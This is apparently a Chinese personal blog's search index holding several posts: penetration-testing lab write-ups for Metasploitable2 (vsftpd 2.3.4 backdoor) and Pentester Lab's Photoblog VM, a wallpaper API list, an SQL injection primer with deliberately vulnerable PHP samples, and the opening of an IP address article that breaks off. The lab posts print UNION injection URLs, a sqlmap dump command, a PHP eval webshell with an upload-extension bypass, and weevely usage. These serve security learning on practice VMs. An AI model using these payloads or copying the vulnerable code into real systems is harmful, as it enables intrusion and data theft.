<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Metasploitable2靶机学习记录</title>
    <url>/2022/10/02/Metasploitable2/</url>
    <content><![CDATA[<h1>关于Metasploitable2</h1>
<blockquote>
<p>这是Metasploitable2（Linux）</p>
<p>Metasploitable是一个故意易受攻击的Linux虚拟机。此VM可用于进行安全培训、测试安全工具和实践常见的渗透测试技术。</p>
<p>默认登录名和密码为msfadmin:msfadmin。</p>
<p>切勿将此VM暴露于不受信任的网络（如果您有任何疑问，请使用NAT或仅主机模式）。</p>
<p>要联系开发者，请发送电子邮件至msfdev@metasploit.com</p>
<p>有关详细信息，请参阅以下URL：</p>
<ul>
<li><a href="https://community.rapid7.com/docs/DOC-1875">https://community.rapid7.com/docs/DOC-1875</a></li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>Metasploitable2</th>
</tr>
</thead>
<tbody>
<tr>
<td>发布日期</td>
<td>2012年6月13日</td>
</tr>
<tr>
<td>作者</td>
<td>rapid7user</td>
</tr>
<tr>
<td>系列</td>
<td>-</td>
</tr>
<tr>
<td>网页</td>
<td><a href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/">https://sourceforge.net/projects/metasploitable/files/Metasploitable2/</a></td>
</tr>
</tbody>
</table>
<h1>环境</h1>
<p>靶机：Metasploitable2（IP:未知）</p>
<p>攻击机：KALI（IP:192.168.198.131）</p>
<p>平台：VMware 16.2.4</p>
<h1>信息收集</h1>
<p><strong>主机发现</strong></p>
<p><code>arp-scan -l</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221002130319.png" alt="QQ截图20221002130319"></p>
<p><strong>使用 nmap 进行扫描主机</strong></p>
<p><code>nmap -sS -Pn -A -p- -n 192.168.198.132</code></p>
<p><img src="https://img.anineg.space/image-20221002131822557.png" alt="image-20221002131822557"></p>
<p><img src="https://img.anineg.space/image-20221002131900368.png" alt="image-20221002131900368"></p>
<p><code>nmap -sV -p- 192.168.198.132</code></p>
<p><img src="https://img.anineg.space/image-20221002132014254.png" alt="image-20221002132014254"></p>
<h2 id="收集到的信息：">收集到的信息：</h2>
<ul>
<li>
<p>IP =&gt; 192.168.198.132</p>
</li>
<li>
<p>开放的端口：(真的是相当的多啊…)</p>
<ul>
<li>
<p>PORT // STATE // SERVICE // VERSION</p>
</li>
<li>
<p>21/tcp    open  ftp         vsftpd 2.3.4</p>
</li>
<li>
<p>22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</p>
</li>
<li>
<p>23/tcp    open  telnet      Linux telnetd</p>
</li>
<li>
<p>25/tcp    open  smtp        Postfix smtpd</p>
</li>
<li>
<p>53/tcp    open  domain      ISC BIND 9.4.2</p>
</li>
<li>
<p>80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</p>
</li>
<li>
<p>111/tcp   open  rpcbind     2 (RPC #100000)</p>
</li>
<li>
<p>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p>
</li>
<li>
<p>445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p>
</li>
<li>
<p>512/tcp   open  exec        netkit-rsh rexecd</p>
</li>
<li>
<p>513/tcp   open  login       OpenBSD or Solaris rlogind</p>
</li>
<li>
<p>514/tcp   open  tcpwrapped</p>
</li>
<li>
<p>1099/tcp  open  java-rmi    GNU Classpath grmiregistry</p>
</li>
<li>
<p>1524/tcp  open  bindshell   Metasploitable root shell</p>
</li>
<li>
<p>2049/tcp  open  nfs         2-4 (RPC #100003)</p>
</li>
<li>
<p>2121/tcp  open  ftp         ProFTPD 1.3.1</p>
</li>
<li>
<p>3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5</p>
</li>
<li>
<p>3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</p>
</li>
<li>
<p>5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</p>
</li>
<li>
<p>5900/tcp  open  vnc         VNC (protocol 3.3)</p>
</li>
<li>
<p>6000/tcp  open  X11         (access denied)</p>
</li>
<li>
<p>6667/tcp  open  irc         UnrealIRCd</p>
</li>
<li>
<p>6697/tcp  open  irc         UnrealIRCd</p>
</li>
<li>
<p>8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)</p>
</li>
<li>
<p>8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</p>
</li>
<li>
<p>8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)</p>
</li>
<li>
<p>37649/tcp open  mountd      1-3 (RPC #100005)</p>
</li>
<li>
<p>41732/tcp open  java-rmi    GNU Classpath grmiregistry</p>
</li>
<li>
<p>42063/tcp open  status      1 (RPC #100024)</p>
</li>
<li>
<p>58117/tcp open  nlockmgr    1-4 (RPC #100021)</p>
</li>
</ul>
</li>
</ul>
<hr>
<h1>渗透测试</h1>
<h2 id="21端口">21端口</h2>
<p>我们可以看到在上方开放的端口中的21端口，版本号是“<strong>vsftpd 2.3.4</strong>”。对于这个版本，我们可以发现存在“笑脸漏洞后门”：</p>
<blockquote>
<p>这个漏洞是开发者在软件中留下的后门漏洞，当连接带有vsftpd 2.3.4版本的服务器的21端口时，输入用户中带有“<code>:)</code>”,密码任意，即可运行 vsf_sysutil_extra() ：打开服务器的6200端口，并且不需要密码就能从6200端口以管理员身份登入目标服务器。因为输入用户名需要带有“<code>:)</code>”，所以称笑脸漏洞。</p>
</blockquote>
<h3 id="开始尝试攻击：">开始尝试攻击：</h3>
<h4 id="ftp连接靶机：">ftp连接靶机：</h4>
<p><code>ftp 192.168.198.132</code></p>
<p><img src="https://img.anineg.space/image-20221002150006975.png" alt="image-20221002150006975"></p>
<p>随便起一个用户名，再用户名中加上笑脸符号<code>:)</code>，密码随意。然后需要稍等片刻。完成后再对靶机端口进行扫描，会发现开启了一个6200端口：</p>
<p><img src="https://img.anineg.space/image-20221002150312694.png" alt="image-20221002150312694"></p>
<h4 id="使用nc对靶机进行连接：">使用nc对靶机进行连接：</h4>
<p><code>nc 192.168.198.132 6200</code></p>
<p><img src="https://img.anineg.space/image-20221002150744826.png" alt="image-20221002150744826"></p>
<p>直接获得root权限。</p>
<h3 id="我们再使用MSF框架来试验一遍：">我们再使用MSF框架来试验一遍：</h3>
<h4 id="执行-msfconsole">执行 <code>msfconsole</code></h4>
<p>msf6 &gt; <code>search vsftpd</code></p>
<p><img src="https://img.anineg.space/image-20221002144134861.png" alt="image-20221002144134861"></p>
<h4 id="使用模块：">使用模块：</h4>
<p>msf6 &gt; <code>use exploit/unix/ftp/vsftpd_234_backdoor</code></p>
<h4 id="设置靶机IP：">设置靶机IP：</h4>
<p>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <code>show options</code></p>
<p>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <code>set rhosts 192.168.198.132</code></p>
<h4 id="运行：">运行：</h4>
<p>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <code>exploit</code></p>
<p><img src="https://img.anineg.space/image-20221002144431744.png" alt="image-20221002144431744"></p>
<p>获取root权限成功。</p>
<hr>
<p>更新中…</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>随机背景API接口整理</title>
    <url>/2022/03/20/backgroundAPI/</url>
    <content><![CDATA[<h1>废话不多说，上图！（每次刷新都不一样哦~）</h1>
<p>（API链接在后面）</p>
<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
<h1>API接口链接</h1>
<h2 id="必应壁纸">必应壁纸</h2>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
<center>今日必应壁纸</center>
<h2 id="野生动漫-API">野生动漫 API</h2>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
<h2 id="系列-API（需自己按照网站说明调用-API-参数）">系列 API（需自己按照网站说明调用 API 参数）</h2>
<blockquote>
<p>小歪 API</p>
<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
</blockquote>
<blockquote>
<p>未知名称动漫 API</p>
<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
</blockquote>
<blockquote>
<p>樱花 API</p>
<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
</blockquote>
<blockquote>
<p>岁月小筑随机背景 API</p>
<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
</blockquote>
<blockquote>
<p>保罗 API</p>
<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
</blockquote>
<blockquote>
<p>樱道随机图片</p>
<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
</blockquote>
<blockquote>
<p>墨天逸</p>
<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
</blockquote>
<blockquote>
<p>Unsplash</p>
<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
</blockquote>
<blockquote>
<p>后宫漫图：</p>
<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
</blockquote>
<blockquote>
<p>EEEDOG</p>
<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
</blockquote>
<blockquote>
<p>东方 Project</p>
<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
</blockquote>
<blockquote>
<p>搏天 API</p>
<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
</blockquote>
<blockquote>
<p>汐岑 ACG</p>
<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
</blockquote>
<blockquote>
<p>凌一 API</p>
<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
</blockquote>
<blockquote>
<p>Lorem Picsum</p>
<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
</blockquote>
<blockquote>
<p>API 接口文档 - 夏沫博客</p>
<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
</blockquote>
<blockquote>
<p>Ushio API</p>
<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
</blockquote>
<blockquote>
<p>点滴 API</p>
<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
</blockquote>
<blockquote>
<p>Langford’s API</p>
<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
</blockquote>
<blockquote>
<p>一铭 API</p>
<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
</blockquote>
<blockquote>
<p>R0A1NG’s API<br>
<a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
</blockquote>
<blockquote>
<p>JacksonXE の API<br>
<a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
</blockquote>
<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
  </entry>
  <entry>
    <title>My Awesome Photoblog靶机学习记录</title>
    <url>/2022/08/08/Photoblog/</url>
    <content><![CDATA[<h1>关于靶机</h1>
<blockquote>
<h2 id="破解渗透测试实验室：从-SQL-注入到-Shell-VM">破解渗透测试实验室：从 SQL 注入到 Shell VM</h2>
<p>‎你好，朋友们！！今天，我们将解决另一个CTF挑战“从SQL注入到Shell I”。此 VM 由 Pentester Lab 开发。您可以从此处下载：<a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/%E2%80%8E">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/‎</a></p>
<p>‎在 VM 软件中安装 iso 映像并启动它。本练习中给出的任务是访问管理控制台并上传 PHP Webshell。‎</p>
<h3 id="水平">水平</h3>
<p>‎初学者‎</p>
<h3 id="说明">说明</h3>
<p>‎本练习说明如何从 SQL 注入中获取对管理控制台的访问权限。然后在管理控制台中，了解如何在系统上运行命令。‎</p>
<h3 id="‎你会学到什么？‎">‎你会学到什么？‎</h3>
<ul>
<li>‎使用 UNION 的 SQL 注入利用‎</li>
<li>‎破解 md5 散列密码‎</li>
<li>‎编写 PHP Webshell‎</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>名称</th>
<th>PENTESTER LAB: FROM SQL INJECTION TO SHELL</th>
</tr>
</thead>
<tbody>
<tr>
<td>发布日期</td>
<td>2012年9月13日</td>
</tr>
<tr>
<td>作者</td>
<td>Pentester Lab</td>
</tr>
<tr>
<td>系列</td>
<td>Pentester Lab</td>
</tr>
<tr>
<td>网页</td>
<td><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/</a></td>
</tr>
</tbody>
</table>
<h1>环境</h1>
<p>靶机：My Awesome Photoblog（IP:192.168.3.108）</p>
<p>攻击机：KALI（IP:192.168.3.96）</p>
<p>平台：VMware 16.2.4</p>
<h1>信息收集</h1>
<p><strong>主机发现</strong></p>
<p><code>arp-scan -l</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182145.png" alt="QQ截图20220808182145"></p>
<p><strong>使用nmap进行扫描主机</strong></p>
<p><code>nmap -sS -Pn -A -p- -n 192.168.3.108</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182345.png" alt="QQ截图20220808182345"></p>
<p><code>nmap -sV -p- 192.168.3.108</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182446.png" alt="QQ截图20220808182446"></p>
<p><strong>web指纹识别</strong></p>
<p><code>whatweb -v 192.168.3.108</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182618.png" alt="QQ截图20220808182618"></p>
<p><strong>网站目录扫描</strong></p>
<p><code>dirb http://192.168.3.108 /usr/share/dirb/wordlists/big.txt</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220808182855.png" alt="QQ截图20220808182855"></p>
<p><strong>查看html代码</strong></p>
<p>访问<code>http://192.168.3.108/</code>，<kbd>Ctrl</kbd>+<kbd>U</kbd>查看页面源代码：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194348.png" alt="QQ截图20220810194348"></p>
<p>发现代码中有<code>cat.php?id=1</code>，疑似可以SQL注入。而<code>admin/uploads/</code>则可能是文件上传的路径。</p>
<h2 id="收集到的信息：">收集到的信息：</h2>
<ul>
<li>IP =&gt; 192.168.3.108</li>
<li>开放的端口：
<ul>
<li>22 =&gt; ssh服务 ---- OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)</li>
<li>80 =&gt; http服务 ---- Apache httpd 2.2.16 ((Debian))</li>
</ul>
</li>
<li>扫描出来的网站目录</li>
<li>疑似可以SQL注入</li>
<li>可能存在文件上传</li>
</ul>
<hr>
<h1>渗透测试</h1>
<div class="tip bolt"><p>首先尝试登陆后台，这里介绍两种方法：</p>
</div>
<h2 id="方法一：尝试进行SQL注入">方法一：尝试进行SQL注入</h2>
<h3 id="判断是否可以注入：">判断是否可以注入：</h3>
<p>构造url：</p>
<p><code>192.168.3.108/cat.php?id=1 and 1=1#</code></p>
<p>页面正常显示</p>
<p><code>192.168.3.108/cat.php?id=1 and 1=2#</code></p>
<p>页面不正常显示：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194602.png" alt="QQ截图20220810194602"></p>
<p>结论：由此说明参数id存在sql注入。</p>
<h3 id="判断列数">判断列数</h3>
<p><code>192.168.3.108/cat.php?id=1 order by 1</code></p>
<p><code>192.168.3.108/cat.php?id=1 order by 2</code></p>
<p>…</p>
<p><code>192.168.3.108/cat.php?id=1 order by 5</code></p>
<p>此时发生报错：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194855.png" alt="QQ截图20220810194855"></p>
<p>则得知列数为4。</p>
<h3 id="联合查询获取数据库名称">联合查询获取数据库名称</h3>
<p>判断显示的列位：</p>
<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,2,3,4#</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194926.png" alt="QQ截图20220810194926"></p>
<p>得知第二列为显示位。继续查询数据库名：</p>
<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,database(),3,4#</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810194952.png" alt="QQ截图20220810194952"></p>
<p>得知数据库名为 <code>photoblog</code></p>
<h3 id="联合查询遍历表名">联合查询遍历表名</h3>
<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,table_name,3,4 from information_schema.tables#</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195115.png" alt="QQ截图20220810195115"></p>
<p>发现有一个users表，可能是网站后台的账号密码。</p>
<h3 id="查询users列名">查询users列名</h3>
<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,column_name,3,4 from information_schema.columns where table_name = 'users'#</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195157.png" alt="QQ截图20220810195157"></p>
<h3 id="查询users表数据">查询users表数据</h3>
<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,login,3,4 from users#</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195228.png" alt="QQ截图20220810195228"></p>
<p>得到后台管理员用户名 ：</p>
<blockquote>
<p>admin</p>
</blockquote>
<p><code>192.168.3.108/cat.php?id=1 and 1=2 union select 1,password,3,4 from users#</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195317.png" alt="QQ截图20220810195317"></p>
<p>得到密文：</p>
<blockquote>
<p>8efe310f9ab3efeae8d410a8e0166eb2</p>
</blockquote>
<p>长度为32，猜测为md5加密，在<a href="https://www.cmd5.com/">cmd5</a>网站解密：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195632.png" alt="QQ截图20220810195632"></p>
<p>得到密码：</p>
<blockquote>
<p>P4ssw0rd</p>
</blockquote>
<h3 id="登录后台">登录后台</h3>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810195712.png" alt="QQ截图20220810195712"></p>
<h2 id="方法二-：使用sqlmap">方法二 ：使用sqlmap</h2>
<p>因为网页的标题是“My Awesome Photoblog”，可以猜测数据库名称为<code>photoblog</code>（在方法一中证明）</p>
<p>使用sqlmap获取该数据库的全部数据：</p>
<p><code>sqlmap –u http://192.168.3.108/cat.php?id=1 –D photoblog --dump-all --batch</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200042.png" alt="QQ截图20220810200042"></p>
<p>直接获得了账户名和登录密码：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200117.png" alt="QQ截图20220810200117"></p>
<hr>
<div class="tip bolt"><p>接下来getshell，这里介绍两种方法：</p>
</div>
<h2 id="方法一：一句话木马-蚁剑连接">方法一：一句话木马+蚁剑连接</h2>
<p>构造一句话木马<code>yijuhua.php</code>并上传， 发现提示不允许上传php。进行一下简单的文件上传绕过，修改后缀为<code>.phP</code>，成功上传。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810200441.png" alt="QQ截图20220810200441"></p>
<p>蚁剑连接：</p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810201802.png" alt="QQ截图20220810201802"></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202139.png" alt="QQ截图20220810202139"></p>
<p>成功getshell！</p>
<h2 id="方法二-：weevely-php菜刀-连接">方法二 ：weevely(php菜刀)连接</h2>
<p>使用kali中的工具weevely，生成一个webshell文件：</p>
<p><code>weevely generate hacker shell.php</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202446.png" alt="QQ截图20220810202446"></p>
<p>修改后缀为<code>.phP</code>进行文件上传，然后使用weevely连接webshell：</p>
<p><code>weevely http://192.168.0.131/admin/uploads/shell.PHP hacker</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220810202826.png" alt="QQ截图20220810202826"></p>
<p>成功连接。</p>
<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
              <div class="content">
              <div class="tag link"><a class="link-card" title="Hack the Pentester Lab: from SQL injection to Shell VM" href="https://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-vm/"><div class="left"><img src="https://img.anineg.space/logo-white.png"></div><div class="right"><p class="text">Hack the Pentester Lab: from SQL injection to Shell VM</p><p class="url">https://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-vm/</p></div></a></div><div class="tag link"><a class="link-card" title="My Awesome Photoblog靶机渗透WP" href="https://www.jianshu.com/p/dd8768dd2b58"><div class="left"><img src="https://img.anineg.space/logo-white.png"></div><div class="right"><p class="text">My Awesome Photoblog靶机渗透WP</p><p class="url">https://www.jianshu.com/p/dd8768dd2b58</p></div></a></div>
              </div>
            </details>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>渗透</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入漏洞（一）</title>
    <url>/2022/02/16/SQL1/</url>
    <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
<h2 id="SQL-注入漏洞产生原因及危害">SQL 注入漏洞产生原因及危害</h2>
<p>SQL 注入漏洞是指攻击者通过浏览器或者其他客户端将恶意 SQL 语句插入到网站参数中,而网站应用程序末对其进行过滤,将恶意 SQL语句带入数据库使恶意 SQL 语句得以执行,从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。<br>
SQL 注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改,甚至可能会造成网站被挂马、服务器被远程控制、被安装后门等。</p>
<h2 id="SQL-注入漏洞示例代码分析">SQL 注入漏洞示例代码分析</h2>
<p>以下是 SQL 注入漏洞的示例代码：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql-"SELECT * FROM users WHBRE id=$id LIMIT O,1";</span><br><span class="line">$result=mysql_query(fsql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
<p>中间件通过 <code>$_GET['id']</code> 获取用户输入的 id 参数的值,并赋值给<code>$id</code> 这个变量。<code>$id</code> 在后面没有经过任何过滤,直接拼接到 SQL 语句中,然后在数据库中执行了此 SQL 语句。<br>
如果用户提交 <code>index.php?id=1 and 1=1</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>，会有正常的结果返回。<br>
如果用户提交 <code>index.php?id=1 and 1=2</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>，会有不正常的结果返回。</p>
<h2 id="SQL注入分类">SQL注入分类</h2>
<p>SQL注入按照数据类型分为<span class="p red">数字型注入</span>和<span class="p red">字符型注入</span>。注入点的数据类型为数字型时为数字型注入,注入点的数据类型为字符型时为字符型注入。<br>
SQL注入按照服务器返回信息是否显示分为报错注入和盲注。如果在注入的过程中,程序将获取的信息或者报错信息直接显示在页面中,这样的注入为报错注入;如果在注入的过程中,程序不显示任何SQL报错信息,只能通过精心构造SQL语句,根据页面是否正常返回或者返回的时间判断注入的结果,这样的注入为盲注。</p>
<h1>数字型注入</h1>
<p>数字型注入就是注入点的数据类型是数字型,没有用单引号引起来。数字型注入的典型示例代码如下:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";    //$id没有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>WHERE id=$id</code>这个SQL语句的子句中,<code>$id</code>变量没有用单引号或者双引号引起来,而是直接拼接到了后面,这样的注入就是典型的数字型注入。</p>
<h2 id="判断数字型注入的方法如下">判断数字型注入的方法如下:</h2>
<h3 id="输入单引号-不正常返回。">输入单引号,不正常返回。</h3>
<p>如果用户提交 <code>index.php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
<h3 id="输入and-1-1-正常返回。">输入<code>and 1=1</code>,正常返回。</h3>
<p>如果用户提交 <code>index.php?id=1 and 1=1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>,会有正常的结果返回。</p>
<h3 id="输入and-1-2-不正常返回">输入<code>and 1=2</code>,不正常返回</h3>
<p>如果用户提交 <code>index.php?id=1 and 1=2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>,会有不正常的结果返回。<br>
数字型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在数字型注入。具体有没有数字型注入,是否可以通过数字型注入获取有效信息,还需要大量的测试来验证。</p>
<h1>字符型注入</h1>
<p>字符型注入就是注入点的数据类型是字符型。字符型注入与数字型注入的区别就是字符型注入要用一对单引号引起来。字符型注入的典型示例代码如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //'$id'有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
<p>这个示例代码与数字型注入的示例代码基本一致,只是在后面的SQL语句拼接中,<code>$id</code>多了一对单引号,<code>$id</code>是字符型数据,这就是典型的字符型注入。</p>
<h2 id="判断字符型注入的方法如下">判断字符型注入的方法如下:</h2>
<h3 id="输入单引号-不正常返回。-v2">输入单引号,不正常返回。</h3>
<p>如果用户提交 <code>index,php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
<h3 id="输入-and-1-1-正常返回">输入<code>'and'1'='1</code>,正常返回</h3>
<p>如果用户提交 <code>index.php?id=1 'and' 1'='1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1</code>,会有正常的结果返回。</p>
<h3 id="输入-and-1-2-不正常返回">输入<code>'and'1'='2</code>,不正常返回</h3>
<p>如果用户提交 <code>index.php?id=1 'and' 1'='2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1</code>,会有不正常的结果返回。<br>
字符型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在字符型注入。具体有没有字符型注入,是否可以通过字符型注入获取有效信息,还需要大量的测试来验证。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>IP地址详解</title>
    <url>/2022/03/17/cgrona1/</url>
    <content><![CDATA[<h1>0x01 IP（IPv4）</h1>
<p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
